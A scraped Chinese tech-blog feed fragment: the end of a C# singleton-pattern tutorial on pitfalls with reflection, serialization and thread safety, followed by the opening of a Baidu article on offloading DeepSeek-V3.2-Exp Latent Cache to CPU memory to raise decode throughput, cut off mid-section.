<pre><code class="hljs language-cs" lang="cs">Type type = <span class="hljs-keyword">typeof</span>(DoubleCheckCacheManager);
ConstructorInfo ctor = type.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, <span class="hljs-literal">null</span>, Type.EmptyTypes, <span class="hljs-literal">null</span>);
<span class="hljs-keyword">var</span> newInstance = (DoubleCheckCacheManager)ctor.Invoke(<span class="hljs-literal">null</span>);
Console.WriteLine(newInstance == DoubleCheckCacheManager.GetInstance()); <span class="hljs-comment">// 输出：False（单例失效）</span>
</code></pre>
<p><strong>防护方案</strong>：在私有构造函数中加校验，若实例已存在则抛异常：</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">DoubleCheckCacheManager</span>()</span>
{
    <span class="hljs-keyword">if</span> (_instance != <span class="hljs-literal">null</span>)
    {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidOperationException(<span class="hljs-string">"单例类不允许创建多个实例"</span>);
    }
    Console.WriteLine(<span class="hljs-string">"DoubleCheckCacheManager实例已创建"</span>);
}
</code></pre>
<h3 data-id="heading-39">2. 序列化会破坏单例</h3>
<p>若单例类实现<code>ISerializable</code>，序列化 + 反序列化会创建新实例：<strong>防护方案</strong>：重写<code>GetObjectData</code>方法，返回已有实例：</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GetObjectData</span>(<span class="hljs-params">SerializationInfo info, StreamingContext context</span>)</span>
{
    info.SetType(<span class="hljs-keyword">typeof</span>(DoubleCheckCacheManager));
}

<span class="hljs-comment">// 反序列化时返回单例实例</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DoubleCheckCacheManager <span class="hljs-title">GetDeserializedInstance</span>(<span class="hljs-params">SerializationInfo info, StreamingContext context</span>)</span>
{
    <span class="hljs-keyword">return</span> GetInstance();
}
</code></pre>
<h3 data-id="heading-40">3. 单例类无法被继承（构造函数私有）</h3>
<p>若需扩展单例类，可改用 “单例 + 接口” 或 “工厂模式 + 单例”。</p>
<h3 data-id="heading-41">4. 单例类的状态是全局的，需注意线程安全</h3>
<p>若单例类有可读写的成员变量（如<code>public int Counter</code>），多线程读写时需加锁：</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _counter = <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Counter
{
    <span class="hljs-keyword">get</span> { <span class="hljs-keyword">lock</span> (_lockObj) <span class="hljs-keyword">return</span> _counter; }
    <span class="hljs-keyword">set</span> { <span class="hljs-keyword">lock</span> (_lockObj) _counter = <span class="hljs-keyword">value</span>; }
}
</code></pre>
<h2 data-id="heading-42">五、总结：单例模式核心要点</h2>
<ol>
<li>
<p><strong>核心目标</strong>：一个类只有一个实例，全局唯一访问点；</p>
</li>
<li>
<p><strong>实现关键</strong>：私有构造函数 + 静态实例 + 全局访问点；</p>
</li>
<li>
<p><strong>推荐实现</strong>：</p>
<ul>
<li>无参数、需延迟初始化：静态内部类；</li>
<li>有参数 / 高频调用：双重检查锁定；</li>
<li>简单场景 / 启动必初始化：饿汉式；</li>
</ul>
</li>
<li>
<p><strong>适用场景</strong>：资源独占、状态统一、全局工具类；</p>
</li>
<li>
<p><strong>避坑重点</strong>：线程安全、反射 / 序列化破坏单例、全局状态的线程安全。</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[突破显存瓶颈：基于 DeepSeek-V3.2-Exp 的 Latent Cache 卸载预取方案设计与模拟验证]]></title>    <link>https://juejin.cn/post/7579659550861721642</link>    <guid>https://juejin.cn/post/7579659550861721642</guid>    <pubDate>2025-12-04T08:29:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579659550861721642" data-draft-id="7579553111473389622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="突破显存瓶颈：基于 DeepSeek-V3.2-Exp 的 Latent Cache 卸载预取方案设计与模拟验证"/> <meta itemprop="keywords" content="云计算"/> <meta itemprop="datePublished" content="2025-12-04T08:29:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="百度智能云技术站"/> <meta itemprop="url" content="https://juejin.cn/user/3472695814005120"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            突破显存瓶颈：基于 DeepSeek-V3.2-Exp 的 Latent Cache 卸载预取方案设计与模拟验证
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3472695814005120/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    百度智能云技术站
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:29:52.000Z" title="Thu Dec 04 2025 08:29:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.    引言</h2>
<p>DeepSeek-V3.2-Exp 所搭载的稀疏化 Attention 计算，在长上下文场景中成功降低了推理延迟。但在 PD 分离架构下，随着序列长度不断增长，Decode 阶段的吞吐受限问题愈发凸显。核心症结在于，Decode 过程中 Latent Cache 规模会随序列长度呈线性增长，而 GPU 显存容量有限，这直接导致 Batch Size 难以提升，进而抑制了 Decode 阶段的吞吐增长。</p>
<p>基于此，本次百度百舸 AIAK 团队研究的核心目标是：针对 DeepSeek-V3.2-Exp，通过将 Latent Cache 下放到 CPU 内存，在满足延迟要求的前提下，提升 Decode 吞吐并显著降低成本。本报告详细阐述了我们为达成该目标所开展的系统瓶颈分析，以及最终提出的 Expanded Sparse Server（ESS）方案的设计与实现。</p>
<p>本文的主要贡献如下：</p>
<ul>
<li>
<p>系统性评估了 Latent Cache Offload 策略在 DeepSeek-V3.2-Exp 上的可行性与收益边界。深入剖析了在稀疏化 Attention 框架下引入卸载 Latent Cache 的可行性、瓶颈来源与潜在收益，明确了不同环境配置与上下文长度条件下的收益上限。</p>
</li>
<li>
<p>提出 ESS（Expanded Sparse Server）系统方案，以卸载 Latent Cache 为核心实现 Decode 吞吐的无损扩展。百度百舸推出的 ESS 是一套面向工业部署的系统化方案，通过解耦 Latent Cache 存储与计算路径，实现 Decode 阶段吞吐的显著提升。同时，ESS 能与 MTP、Two-Batch Overlap 等主流优化策略无缝兼容，可作为现有推理系统的增强组件。</p>
</li>
<li>
<p>构建了高保真模拟器，用于评估多种优化策略在真实工业场景下的性能表现。该模拟器能够精确建模模型计算、通信延迟以及 Offload-Prefetch 开销，使开发者在系统实现前即可获得可靠的性能预估，显著降低工程验证成本并加速方案迭代。</p>
</li>
</ul>
<p>模拟实验结果显示，在 32K 上下文长度下，当 MTP 从 2 提升到 4 时，ESS 方案可实现整体 123.4% 的吞吐提升。其中，53.1% 的提升源于 MTP 提升本身，剩余 70.2% 的性能收益则由 ESS 所实现的 Offload-Prefetch 机制贡献。</p>
<p>针对超长上下文场景的额外测试结果表明，在 MTP = 2 且上下文长度为 128K 的条件下，ESS 的 Offload-Prefetch 机制能直接带来高达 123% 的吞吐提升。</p>
<h2 data-id="heading-1">2.    问题背景及优化动机</h2>
<h3 data-id="heading-2">2.1.     显存是限制吞吐的主要因素</h3>
<p>图 1 呈现了 32K 上下文下 Batch Size 与 Decode 吞吐的关系（数据由高保真模拟器生成），对应的系统配置如表 1 所示。理论上，随着 Batch Size 增大，吞吐应持续提升，这是因为 Batch Size 与 GEMM 算子的计算强度（Arithmetic Intensity）密切相关 —— 更大的 Batch Size 能显著提高 MFU，进而提升整体算力利用率。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/564dc3197bdd49fbacd6e4fa6b590993~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=D3%2FSBM5SGdDd%2FQmeYfoatXHmk9E%3D" alt="图片" loading="lazy"/></p>
<p align="center">图 1. 吞吐和 Batch Size 之间的关系
</p><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc4979909ba84f0295528569d3ad720a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=Q5HhL84rAK0hBfQfNnijAS0MiDU%3D" alt="b84ea8c525ccfb4ecde0267a9d70171e.png" loading="lazy"/></p>
<p align="center">表 1.    实验环境及优化选项
</p><p>但在当前配置下，GPU 显存容量成为关键瓶颈：Batch Size 最多仅能提升至 52，对应的吞吐仅为 9647 tokens/s。在此情况下，系统无法进一步扩大计算批次，导致吞吐远低于硬件理论上限。由此可得出结论：显存容量是限制 Decode 吞吐扩展的主要因素。</p>
<p>这一发现直接凸显了 Offload-Prefetch 策略的必要性与价值：通过打破 Latent Cache 与 GPU 显存的绑定关系，系统才能突破现有吞吐上限，进一步释放计算潜能。</p>
<h3 data-id="heading-3">2.2.    Latent Cache 的访问具有时间局部性</h3>
<p>为缓解显存压力且保证精度不受影响，将部分 Latent Cache 卸载至 CPU 是一种具备实际可行性的优化方案。但该方案要实现高效运行，需满足一个关键前提：Latent Cache 的访问模式应具有良好的局部性（Locality）。</p>
<p>只有当模型在访问 Latent Cache 时展现出足够的重复性或邻近性，才能维持较高的缓存命中率；否则，频繁的跨 PCIe 访问会使带宽成为新的瓶颈，从而抵消 Offloading 带来的收益。</p>
<p>为验证 DeepSeek-V3.2-Exp 中的 Latent-Cache 是否具备足够的局部性，我们从两个维度对其访问模式进行评估：</p>
<ul>
<li>
<p>层间访问（Inter-layer Access）：关注不同层之间在相邻生成步骤中对 Latent Cache 访问的相似程度。</p>
</li>
<li>
<p>层内访问（Intra-layer Access）：关注同一层在连续生成步骤中的 Latent Cache 访问是否稳定一致。</p>
</li>
</ul>
<p>我们分别定义了 Inter-Layer Similarity 与 Intra-Layer Similarity 两个指标，用于量化上述两类访问模式的局部性特征。第 L 层在生成第 t 步时所需的 Top-K 索引集合为 K^{L}_{t}。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef10cad131a840f8b12b1dcde3ee96d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=etsBZsX1ET%2FDYQG0jv90aw671t0%3D" alt="图片" loading="lazy"/></p>
<p>公式（1）与公式（2）分别给出了层间相似度与层内相似度的数学定义。两个指标均基于集合相似度构造，用来刻画访问需求与 GPU 中已有缓存之间的重合度 —— 重合度越高，说明局部性越强，越适合 Offload-Prefetch 策略。</p>
<p>基于 LongBench-v2 数据集在 DeepSeek-V3.2-Exp 模型上的实验结果（见图 2 与图 3），我们观察到层间与层内访问均呈现出较高的相似度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53e1376de29c461b8941e310682dfe2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=%2Bq6GCopY251M5KVYw%2BS6PqguSgI%3D" alt="图片" loading="lazy"/></p>
<p align="center">图 2.    Inter-Layer Similarity 在不同上下文长度中的统计</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc8c61a2ad434b7a9b309d547b54e413~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=XCaEfirMYXbLb9qn6MvKzgh9Cm4%3D" alt="图片" loading="lazy"/></p>
<p align="center">图 3.    Intra-Layer Similarity 在不同上下文中的统计</p>
<p>这一现象表明，Latent Cache 的访问具有良好的局部性特征。因此，将 CPU 内存作为 HBM 的扩展存储空间仍是一条可行路径。尽管已有诸多类似工作探索了 CPU–GPU 协同存储，但在结合 PD 分离架构与 SGLang 推理框架时，我们仍面临以下特有挑战：</p>
<ul>
<li>
<p>低效的小块数据拷贝：在 DeepSeek-V3.2-Exp 中，每个 Latent Cache 的大小仅为 656 Byte，且每次访问的 2048 个 Latent Cache 块在 Memory Pool 中呈离散分布。这种高度离散的小块数据访问模式使得 PCIe 难以形成有效的批量传输，显著降低链路带宽利用率，成为 Offload-Prefetch 类方案的主要瓶颈。</p>
</li>
<li>
<p>大量的 Cache Miss：为提升 Batch Size，需尽可能减少驻留在 GPU 上的 Latent Cache 数量。但缩小 GPU 侧的 Latent Cache 会提高 Cache Miss 的发生概率，进而增加 H2D（Host-to-Device）传输量。由于这些传输无法与计算完全重叠，由此引入的数据传输延迟会导致 Decode 阶段的吞吐量低于预期。</p>
</li>
<li>
<p>难以隐藏的数据传输延迟：在 Decode 阶段，可用于掩盖数据传输延迟的计算量不足，无法将传输完全隐藏。当大量出现 Cache Miss 时，这些传输延迟会暴露到关键路径上，进一步降低推理性能。</p>
</li>
</ul>
<h2 data-id="heading-4">3.    ESS 方案设计与分析</h2>
<p>如前文所述，卸载–预取（Offload–Prefetch）是近年来广泛采用的一类无损优化策略，尤其适用于对精度高度敏感的推理场景。因此，我们在设计方案时同样以卸载为核心思路。</p>
<p>在 DeepSeek-V3.2-Exp 中，Cache 主要由两部分构成：Indexer Cache 与 Latent Cache。其中，Indexer Cache 用于计算每个 Latent Cache 的重要性，并从中选取最关键的 2048 个 Latent Cache 参与计算。根据模型架构分析，Indexer Cache 需要执行全量计算且其占比仅为 16.8%。基于这一事实，我们选择不对 Indexer Cache 进行卸载，仅对 Latent Cache 部分实施 Offload–Prefetch 优化。图 4 总结了在 PD 分离模式下卸载与预取的触发时机。</p>
<p>此外，本小节还围绕 2.2 小节中提出的关键挑战展开针对性分析，并据此给出相应的优化设计。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cabe9dc7c2fe458ba89d266a2a9f967b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=vFfoEIh3odtgFZc0rW6RtYNwGOQ%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 4.    PD 分离场景中，Latent Cache 卸载预取时机流程图</p>
<h3 data-id="heading-5">3.1.    小块数据拷贝</h3>
<p>尽管 PCIe 5.0 在单向方向上可提供高达 64 GB/s 的带宽，为 Offload–Prefetch 类方案带来了理论上的可行性，但在现代推理框架（如 SGLang）中，这一带宽往往难以被充分利用。原因在于 SGLang 采用 PagedAttention 管理 Latent Cache，将其划分为多个页面存储，导致页面之间在物理地址上不连续。进一步地，DeepSeek-V3.2-Exp 引入了更细粒度的稀疏化策略，将换入 / 换出的最小单元缩减到单个 Latent Cache 项。这种高度离散的小块数据访问模式会将大带宽链路切割成大量碎片化事务，从而显著降低实际可用带宽。</p>
<p>在 Offload–Prefetch 类方案中，Latent Cache 会发生频繁的卸载和预取操作，而 PCIe 带宽则决定了这一操作的效率。同时考虑到 Latent Cache 属于小尺寸 Cache，每个 block 为 656 字节。经测试，cudaMemcpyAsync 在这种场景中，H2D 和 D2H 的实际带宽分别仅为 0.79GB/s 和 0.23G/s。</p>
<h4 data-id="heading-6">3.1.1.    FlashTrans</h4>
<p>为缓解这一问题，我们在系统设计中引入了 UVA，使 GPU 能够直接访问 CPU 端的 pinned memory，从而减少经由 PCIe 进行小块数据传输时的管理开销。基于 UVA，我们设计了 FlashTrans CUDA 算子，其通过地址驱动的按需传输机制，避免了频繁调用 cudaMemcpyAsync 所带来的调度开销。FlashTrans 在细粒度、非连续的 Latent Cache 访问模式下显著提升了有效带宽，使得 Offload–Prefetch 在 DeepSeek-V3.2-Exp 中得以切实落地。</p>
<p>经测试，FlashTrans 在 H2D 和 D2H 的性能分别为 37GB/s 和 43GB/s。为确保有效带宽，对 Latent Cache 的卸载和预取，我们均使用 FlashTrans 进行。</p>
<h3 data-id="heading-7">3.2.    缓存命中保证</h3>
<p>较高的缓存命中率能够显著降低数据传输量。为此，ESS 首先基于 LRU 算法构建换入换出引擎，对推理过程中的 Cache Miss 行为进行了系统性分析。除此之外，我们还提出 LRU-Warmup 用于保障推理初期的低 Cache Miss。</p>
<h4 data-id="heading-8">3.2.1.    LRU-Warmup</h4>
<p>GPU 端 Sparse Memory Pool 的初始状态对生成早期的性能影响显著。如图 5 所示，生成初期会出现大量 Cache Miss，但随着 Decode 的推进，该现象会快速收敛。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09212f85445a415089508db4c1266623~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=r9hBKInR7wwHBhll7b%2FxIDxPXz8%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 5.    Decode 初期 Cache Miss 严重 MTP=1，Sparse Memory Ratio=0.2</p>
<p>为降低这一初始阶段的额外开销，我们对 LRU Recording 进行预热（LRU- Warmup）。具体而言，我们利用 Prefill 阶段最后 32 个窗口中所选取的 Top-2K Latent Cache Indices，并依次将其注入 LRU，以构建更符合初始生成需求的缓存状态。如图 6 所示，该策略能够显著降低 Decode 初期的 Cache Miss 量，从而提升早期推理阶段的效率。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7be7e7effb644b0eaaba8bb947813033~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=BbB5SVMaahJ8TYUVRiTQxzVtJnE%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 6.    LRU-Warmup 之后的 Cache Miss 情况</p>
<h4 data-id="heading-9">3.2.2.    Cache Miss 分析</h4>
<p>在第 2.2 节中，我们验证了 Deepseek-V3.2-Exp 在 Latent Cache 访问上同时呈现层内与层间的时间局部性。这一特性表明：一旦某个 Latent Cache 在当前步被访问，其在后续步骤中再次被访问的概率仍然较高。基于这一观察，我们采用 LRU 策略对 GPU 端的 Sparse Memory Pool 进行持续更新，使其能够优先保留未来最可能被需求的 Cache。</p>
<p>图 7 展示了依据 Intra-Layer Access 构建 Sparse Memory Pool 后，每个 batch 的平均 Cache Miss 数量。我们进一步在不同的 Sparse Memory Ratio 下进行了对比分析，这些结果共同刻画了在不同显存预算下可获得的性能收益边界。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ffacb090ee34120af26ebbd81b81ad0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=px0jBcEXDcf8nmi9YJzmTUqszGE%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 7.    Intra-Layer Cache Miss 情况，MTP=2</p>
<p>为进一步降低 Decoding 期间 Cache Miss 发生率，我们尝试通过层间预取的方式缓解层内预取的 Cache Miss 压力。之所以有这样的思考，是因为我们在层间同样发现了极高的局部性（如图 1）。具体而言，我们首先根据 L−1 层的 Top-K Indices 预先从 CPU 中取出对应第 L 层的 Latent Cache。该部分数据传输将和 MLP 进行重叠。如此利用层间预取，能有效减少层内 Cache Miss 的发生。具体效果如图 7 和图 8 所示。考虑层间预取后，层内命中率计算如公式 3。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3845035d5120491ebf28dcdc46847725~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=xJ5b0rHkn1acj4rr7AJeUIdmtLQ%3D" alt="图片" loading="lazy"/></p>
<p>其中，I^L 表示第 L 层 Sparse Memory Pool。不过，利用层间预取时，会预取大量无用的 Latent Cache。经统计，在 Sparse Memory Ratio 为 0.2 时，层间预取的 Cache Miss 平均为 663 个每 Batch，最大为 1353 个每 Batch。因此，我们认为尽管层间预取能够缓解层内预取的  Cache Miss 压力，但无法真正对端到端加速起到作用。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae210450b1c345e882d245bd66629fd5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=NDcUF5%2Fn%2BT9hbqDZ9C8bk4Jlb%2BQ%3D" alt="image.png" loading="lazy"/></p>
<p align="center">图 8.    平均 Cache Miss 情况对比</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82dd2bd807c845c6ae6af968618e37b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqm5pm66IO95LqR5oqA5pyv56uZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765441792&amp;x-signature=TrUpwK9aETmKP8EyERNkxe9bVLY%3D" alt="图片" loading="lazy"/></p>
<p align="center">图 9.    最大 Cache Miss 情况对比</p>
<h3 data-id="heading-10">3.3.    计算传输重叠</h3>
<p>影响端到端性能的另一项关键策略是计算与通信的重叠。基于对 SGLang 现有实现的系统性拆解与分析，我们设计了 Dual-Attention (DA) Overlap 和 DualBatch-Attention (DBA) Overlap 两种方案，以最大化计算过程与数据传输之间的重叠程度，从而进一步提升整体吞吐。</p>
<h4 data-id="heading-11">3.3.1.    Overlap 作用分析</h4>
<p>图 10 展示了在未采用 Overlap 策略时推理过程的完整 timeline。图中，H2D 表示对 Missed Latent Cache 的获取。此外，还包含一段较小的 D2H 操作，用于将当前 step 新生成的 Latent Cache 写回 CPU 端的 Total Memory Pool。</p>
<p>在不启用 Overlap 的情况下，这两类数据传输均必须等待 Indexer 计算完成后才能启动，而后续的 Attention 计算又必须在所有传输结束后才能继续执行。这样的严格依赖使得不同阶段无法并行，最终构成一条完全串行的执行链路，从而显著限制了整体吞吐。</p>
<h4 data-id="heading-12">3.3.2.    Overlap 策略</h4>
<ul>
<li>
<p>Without Overlap：该模式对应当前 SGLang 的默认实现，不包含任何计算与通信的重叠。在此模式下，GPU 在等待 H2D 数据拷贝期间处于 idle 状态，导致整体吞吐率显著低于硬件可达上限。</p>
</li>
<li>
